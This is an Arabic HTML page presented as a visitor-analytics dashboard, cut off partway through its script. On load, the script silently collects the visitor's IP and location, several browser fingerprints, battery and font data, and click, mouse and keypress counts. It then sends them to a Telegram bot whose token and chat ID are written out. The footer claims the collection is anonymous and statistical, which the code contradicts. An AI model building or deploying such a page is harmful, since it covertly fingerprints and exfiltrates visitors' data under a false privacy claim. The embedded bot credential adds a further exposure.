<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز الزوار المتقدم</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        :root {
            --primary-color: #4361ee;
            --secondary-color: #3f37c9;
            --accent-color: #4895ef;
            --dark-color: #1b263b;
            --light-color: #f8f9fa;
            --success-color: #4cc9f0;
            --warning-color: #f8961e;
            --danger-color: #f94144;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            color: var(--dark-color);
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        header {
            text-align: center;
            margin-bottom: 2rem;
            animation: fadeInDown 1s;
        }
        
        header h1 {
            font-size: 2.5rem;
            color: var(--secondary-color);
            margin-bottom: 0.5rem;
            background: linear-gradient(to right, #4361ee, #3a0ca3);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        header p {
            font-size: 1.1rem;
            color: var(--dark-color);
            opacity: 0.8;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            margin-bottom: 2rem;
        }
        
        @media (max-width: 768px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
        }
        
        .card {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 15px;
            padding: 1.5rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s, box-shadow 0.3s;
            animation: fadeIn 1s;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
        }
        
        .card h2 {
            color: var(--primary-color);
            margin-bottom: 1rem;
            font-size: 1.5rem;
            border-bottom: 2px solid var(--accent-color);
            padding-bottom: 0.5rem;
            display: flex;
            align-items: center;
        }
        
        .card h2 i {
            margin-left: 0.5rem;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
        }
        
        .info-item {
            margin-bottom: 1rem;
        }
        
        .info-item h3 {
            font-size: 0.9rem;
            color: var(--secondary-color);
            margin-bottom: 0.3rem;
        }
        
        .info-item p {
            font-size: 1rem;
            background: rgba(67, 97, 238, 0.1);
            padding: 0.5rem;
            border-radius: 8px;
            word-break: break-word;
        }
        
        .map-container {
            height: 300px;
            border-radius: 15px;
            overflow: hidden;
            margin-top: 1rem;
            background: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        
        .map-placeholder {
            position: absolute;
            text-align: center;
            padding: 1rem;
            z-index: 1;
        }
        
        .behavior-stats {
            display: flex;
            justify-content: space-between;
            margin-top: 1rem;
        }
        
        .stat-item {
            text-align: center;
            padding: 1rem;
            border-radius: 10px;
            background: rgba(72, 149, 239, 0.1);
            flex: 1;
            margin: 0 0.5rem;
        }
        
        .stat-item h3 {
            font-size: 0.9rem;
            color: var(--secondary-color);
        }
        
        .stat-item .value {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--primary-color);
            margin: 0.5rem 0;
        }
        
        .stat-item .unit {
            font-size: 0.8rem;
            color: var(--dark-color);
            opacity: 0.7;
        }
        
        .footer {
            text-align: center;
            margin-top: 3rem;
            padding: 1rem;
            font-size: 0.9rem;
            color: var(--dark-color);
            opacity: 0.7;
            animation: fadeIn 1s;
        }
        
        /* تأثيرات خاصة */
        .glow {
            animation: glow 2s infinite alternate;
        }
        
        @keyframes glow {
            from {
                box-shadow: 0 0 5px rgba(67, 97, 238, 0.5);
            }
            to {
                box-shadow: 0 0 20px rgba(67, 97, 238, 0.8);
            }
        }
        
        /* أيقونات */
        .icon {
            width: 24px;
            height: 24px;
            margin-left: 0.5rem;
        }
        
        /* رسوم متحركة */
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
        
        .floating {
            animation: float 3s ease-in-out infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="animate__animated animate__fadeInDown">
            <h1>مركز الزوار المتقدم</h1>
            <p>نظام متكامل لتحليل زوار الموقع وتتبع الإحصائيات</p>
        </header>
        
        <div class="dashboard">
            <!-- بطاقة معلومات الزائر -->
            <div class="card animate__animated animate__fadeInLeft">
                <h2><i class="icon">👤</i> معلومات الزائر</h2>
                <div class="info-grid" id="visitor-info">
                    <!-- سيتم ملؤها بالبيانات عبر JavaScript -->
                </div>
            </div>
            
            <!-- بطاقة معلومات الجهاز -->
            <div class="card animate__animated animate__fadeInRight">
                <h2><i class="icon">💻</i> معلومات الجهاز</h2>
                <div class="info-grid" id="device-info">
                    <!-- سيتم ملؤها بالبيانات عبر JavaScript -->
                </div>
            </div>
            
            <!-- بطاقة الموقع الجغرافي -->
            <div class="card animate__animated animate__fadeInLeft">
                <h2><i class="icon">🌍</i> الموقع الجغرافي</h2>
                <div class="info-grid" id="location-info">
                    <!-- سيتم ملؤها بالبيانات عبر JavaScript -->
                </div>
                <div class="map-container">
                    <div class="map-placeholder" id="map-placeholder">
                        <p>جاري تحميل خريطة الموقع...</p>
                    </div>
                </div>
            </div>
            
            <!-- بطاقة سلوك الزائر -->
            <div class="card animate__animated animate__fadeInRight">
                <h2><i class="icon">📊</i> تحليل السلوك</h2>
                <div class="behavior-stats">
                    <div class="stat-item">
                        <h3>وقت البقاء</h3>
                        <div class="value" id="time-spent">0</div>
                        <div class="unit">ثانية</div>
                    </div>
                    <div class="stat-item">
                        <h3>عمق التمرير</h3>
                        <div class="value" id="scroll-depth">0</div>
                        <div class="unit">%</div>
                    </div>
                    <div class="stat-item">
                        <h3>عدد النقرات</h3>
                        <div class="value" id="click-count">0</div>
                        <div class="unit">نقرة</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer animate__animated animate__fadeInUp">
            <p>جميع البيانات يتم جمعها بشكل مجهول ولأغراض إحصائية فقط</p>
        </div>
    </div>

    <script>
        // كائن شامل لبيانات الزائر
        const visitorData = {
            basicInfo: {},
            deviceInfo: {},
            networkInfo: {},
            behaviorInfo: {
                scrollDepth: 0,
                timeSpent: 0,
                clicks: 0,
                mouseMovements: 0,
                keysPressed: 0
            },
            privacyInfo: {},
            advancedInfo: {}
        };

        // عناصر DOM
        const elements = {
            visitorInfo: document.getElementById('visitor-info'),
            deviceInfo: document.getElementById('device-info'),
            locationInfo: document.getElementById('location-info'),
            mapPlaceholder: document.getElementById('map-placeholder'),
            timeSpent: document.getElementById('time-spent'),
            scrollDepth: document.getElementById('scroll-depth'),
            clickCount: document.getElementById('click-count')
        };

        // بدء جمع البيانات عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', async () => {
            await collectAllData();
            displayDataOnPage();
            startBehaviorTracking();
            sendDataToTelegram();
        });

        // جمع جميع البيانات
        async function collectAllData() {
            try {
                // جمع المعلومات الأساسية
                visitorData.basicInfo = {
                    timestamp: new Date().toLocaleString('ar-EG'),
                    pageTitle: document.title,
                    pageUrl: window.location.href,
                    referrer: document.referrer || "زيارة مباشرة",
                    ip: await getIPAddress()
                };

                // جمع معلومات الجهاز
                visitorData.deviceInfo = {
                    os: getOS(),
                    browser: getBrowser(),
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    deviceType: getDeviceType(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    cpuCores: navigator.hardwareConcurrency || "غير معروف",
                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف",
                    touchSupport: 'ontouchstart' in window ? 'مدعوم' : 'غير مدعوم'
                };

                // جمع معلومات الشبكة والموقع
                const ipInfo = await getIPInfo(visitorData.basicInfo.ip);
                visitorData.networkInfo = {
                    ip: visitorData.basicInfo.ip,
                    isp: ipInfo.org || "غير معروف",
                    connectionType: getConnectionType(),
                    vpnOrProxy: ipInfo.proxy || ipInfo.hosting ? 'نعم' : 'لا',
                    location: {
                        country: ipInfo.country_name || "غير معروف",
                        countryCode: ipInfo.country_code || "غير معروف",
                        region: ipInfo.region || "غير معروف",
                        city: ipInfo.city || "غير معروف",
                        postalCode: ipInfo.postal || "غير معروف",
                        latitude: ipInfo.latitude || 0,
                        longitude: ipInfo.longitude || 0
                    }
                };

                // جمع معلومات الخصوصية
                visitorData.privacyInfo = {
                    adBlockEnabled: await checkAdBlock() ? 'مفعل' : 'غير مفعل',
                    privateBrowsing: await checkPrivateBrowsing() ? 'نعم' : 'لا',
                    doNotTrack: navigator.doNotTrack === "1" ? 'مفعل' : 'غير مفعل'
                };

                // جمع معلومات متقدمة
                visitorData.advancedInfo = {
                    canvasFingerprint: getCanvasFingerprint(),
                    webGLInfo: getWebGLInfo(),
                    batteryStatus: await getBatteryStatus(),
                    installedFonts: await getInstalledFonts(),
                    browserPlugins: getBrowserPlugins()
                };

            } catch (error) {
                console.error("Error collecting data:", error);
                sendErrorToTelegram(error);
            }
        }

        // عرض البيانات على الصفحة
        function displayDataOnPage() {
            // معلومات الزائر الأساسية
            elements.visitorInfo.innerHTML = `
                <div class="info-item">
                    <h3>عنوان IP</h3>
                    <p>${visitorData.basicInfo.ip}</p>
                </div>
                <div class="info-item">
                    <h3>وقت الزيارة</h3>
                    <p>${visitorData.basicInfo.timestamp}</p>
                </div>
                <div class="info-item">
                    <h3>الصفحة</h3>
                    <p>${visitorData.basicInfo.pageTitle}</p>
                </div>
                <div class="info-item">
                    <h3>مصدر الزيارة</h3>
                    <p>${visitorData.basicInfo.referrer}</p>
                </div>
                <div class="info-item">
                    <h3>مانع الإعلانات</h3>
                    <p>${visitorData.privacyInfo.adBlockEnabled}</p>
                </div>
                <div class="info-item">
                    <h3>التصفح الخاص</h3>
                    <p>${visitorData.privacyInfo.privateBrowsing}</p>
                </div>
            `;

            // معلومات الجهاز
            elements.deviceInfo.innerHTML = `
                <div class="info-item">
                    <h3>نظام التشغيل</h3>
                    <p>${visitorData.deviceInfo.os}</p>
                </div>
                <div class="info-item">
                    <h3>المتصفح</h3>
                    <p>${visitorData.deviceInfo.browser}</p>
                </div>
                <div class="info-item">
                    <h3>دقة الشاشة</h3>
                    <p>${visitorData.deviceInfo.screenResolution}</p>
                </div>
                <div class="info-item">
                    <h3>نوع الجهاز</h3>
                    <p>${visitorData.deviceInfo.deviceType}</p>
                </div>
                <div class="info-item">
                    <h3>المنطقة الزمنية</h3>
                    <p>${visitorData.deviceInfo.timezone}</p>
                </div>
                <div class="info-item">
                    <h3>اللغة</h3>
                    <p>${visitorData.deviceInfo.language}</p>
                </div>
                <div class="info-item">
                    <h3>أنوية المعالج</h3>
                    <p>${visitorData.deviceInfo.cpuCores}</p>
                </div>
                <div class="info-item">
                    <h3>ذاكرة الجهاز</h3>
                    <p>${visitorData.deviceInfo.deviceMemory}</p>
                </div>
            `;

            // معلومات الموقع الجغرافي
            elements.locationInfo.innerHTML = `
                <div class="info-item">
                    <h3>البلد</h3>
                    <p>${visitorData.networkInfo.location.country}</p>
                </div>
                <div class="info-item">
                    <h3>المدينة</h3>
                    <p>${visitorData.networkInfo.location.city}</p>
                </div>
                <div class="info-item">
                    <h3>المنطقة</h3>
                    <p>${visitorData.networkInfo.location.region}</p>
                </div>
                <div class="info-item">
                    <h3>مزود الخدمة</h3>
                    <p>${visitorData.networkInfo.isp}</p>
                </div>
                <div class="info-item">
                    <h3>نوع الاتصال</h3>
                    <p>${visitorData.networkInfo.connectionType}</p>
                </div>
                <div class="info-item">
                    <h3>VPN/بروكسي</h3>
                    <p>${visitorData.networkInfo.vpnOrProxy}</p>
                </div>
            `;

            // عرض خريطة الموقع إذا توفرت الإحداثيات
            if (visitorData.networkInfo.location.latitude && visitorData.networkInfo.location.longitude) {
                showMap(visitorData.networkInfo.location.latitude, visitorData.networkInfo.location.longitude);
            }
        }

        // تتبع سلوك الزائر
        function startBehaviorTracking() {
            // تتبع وقت البقاء
            const timeInterval = setInterval(() => {
                visitorData.behaviorInfo.timeSpent++;
                elements.timeSpent.textContent = visitorData.behaviorInfo.timeSpent;
            }, 1000);

            // تتبع عمق التمرير
            window.addEventListener('scroll', () => {
                const scrollPercentage = Math.round(
                    (window.scrollY + window.innerHeight) / document.body.scrollHeight * 100
                );
                visitorData.behaviorInfo.scrollDepth = Math.max(
                    visitorData.behaviorInfo.scrollDepth, 
                    scrollPercentage
                );
                elements.scrollDepth.textContent = visitorData.behaviorInfo.scrollDepth;
            });

            // تتبع النقرات
            document.addEventListener('click', () => {
                visitorData.behaviorInfo.clicks++;
                elements.clickCount.textContent = visitorData.behaviorInfo.clicks;
            });

            // تتبع حركات الماوس
            document.addEventListener('mousemove', () => {
                visitorData.behaviorInfo.mouseMovements++;
            });

            // تتبع ضغطات المفاتيح
            document.addEventListener('keydown', () => {
                visitorData.behaviorInfo.keysPressed++;
            });

            // إيقاف العد عند مغادرة الصفحة
            window.addEventListener('beforeunload', () => {
                clearInterval(timeInterval);
            });
        }

        // عرض خريطة الموقع
        function showMap(lat, lng) {
            elements.mapPlaceholder.innerHTML = `
                <iframe 
                    width="100%" 
                    height="100%" 
                    frameborder="0" 
                    scrolling="no" 
                    marginheight="0" 
                    marginwidth="0" 
                    src="https://maps.google.com/maps?q=${lat},${lng}&z=12&output=embed"
                    style="border-radius: 15px;"
                ></iframe>
            `;
        }

        // ===== الدوال المساعدة لجمع البيانات =====

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "غير معروف";
            } catch {
                return "غير معروف";
            }
        }

        async function getIPInfo(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                return await response.json();
            } catch {
                return {};
            }
        }

        function getOS() {
            const userAgent = navigator.userAgent;
            if (/Windows/.test(userAgent)) return "Windows";
            if (/Macintosh/.test(userAgent)) return "MacOS";
            if (/Linux/.test(userAgent)) return "Linux";
            if (/Android/.test(userAgent)) return "Android";
            if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return "iOS";
            return "غير معروف";
        }

        function getBrowser() {
            const userAgent = navigator.userAgent;
            if (/Chrome/.test(userAgent)) return "Chrome";
            if (/Firefox/.test(userAgent)) return "Firefox";
            if (/Safari/.test(userAgent)) return "Safari";
            if (/Edge/.test(userAgent)) return "Edge";
            if (/Opera|OPR/.test(userAgent)) return "Opera";
            if (/IE|Trident/.test(userAgent)) return "Internet Explorer";
            return "غير معروف";
        }

        function getDeviceType() {
            const userAgent = navigator.userAgent;
            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
            const isTablet = /(iPad|Android(?!.*Mobile)|Tablet)/i.test(userAgent);
            
            if (isTablet) return "تابلت";
            if (isMobile) return "هاتف محمول";
            return "كمبيوتر";
        }

        function getConnectionType() {
            if (navigator.connection) {
                const connection = navigator.connection;
                let type = connection.effectiveType || "غير معروف";
                if (connection.saveData) type += " (توفير البيانات)";
                if (connection.downlink) type += ` ~${Math.round(connection.downlink)}Mbps`;
                return type;
            }
            return "غير معروف";
        }

        async function checkAdBlock() {
            try {
                const response = await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {
                    method: 'HEAD',
                    mode: 'no-cors',
                    cache: 'no-store'
                });
                return false;
            } catch {
                return true;
            }
        }

        async function checkPrivateBrowsing() {
            try {
                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (!fs) return false;
                
                return new Promise(resolve => {
                    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
                });
            } catch {
                return false;
            }
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('بصمة المتصفح', 2, 15);
                return canvas.toDataURL().substring(22);
            } catch {
                return "غير متاح";
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "غير مدعوم";
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? 
                    `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}` : 
                    "معلومات محدودة";
            } catch {
                return "خطأ في الجلب";
            }
        }

        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level * 100,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch {
                    return "غير متاح";
                }
            }
            return "غير مدعوم";
        }

        async function getInstalledFonts() {
            if (!window.queryLocalFonts) return "واجهة برمجة الخطوط غير مدعومة";
            
            try {
                const fonts = await window.queryLocalFonts();
                return fonts.map(font => font.family).filter((v, i, a) => a.indexOf(v) === i);
            } catch {
                return "تم رفض الإذن";
            }
        }

        function getBrowserPlugins() {
            return Array.from(navigator.plugins).map(plugin => plugin.name);
        }

        // ===== إرسال البيانات إلى Telegram =====

        function sendDataToTelegram() {
            const message = formatTelegramMessage();
            const botToken = "8142432100:AAE0fMyk2wSz1V8h1ck_DdDm9mbXktzaG-4"; // استبدل به
            const chatId = "7380938730";    // استبدل به
            
            // إذا كانت الرسالة طويلة جدًا، نقسمها إلى أجزاء
            const maxLength = 4096;
            const messageParts = [];
            
            for (let i = 0; i < message.length; i += maxLength) {
                messageParts.push(message.substring(i, i + maxLength));
            }
            
            // إرسال كل جزء على حدة
            messageParts.forEach((part, index) => {
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(part)}&parse_mode=Markdown`;
                
                // تأخير إرسال الأجزاء لتجنب حظر Telegram للطلبات السريعة
                setTimeout(() => {
                    fetch(url).catch(err => console.error("Error sending part", index, err));
                }, index * 1000);
            });
        }

        function formatTelegramMessage() {
            const data = visitorData;
            
            let message = `🔍 *تقرير متقدم عن الزائر* 🔍\n\n`;
            message += `🕒 *الوقت*: ${data.basicInfo.timestamp}\n`;
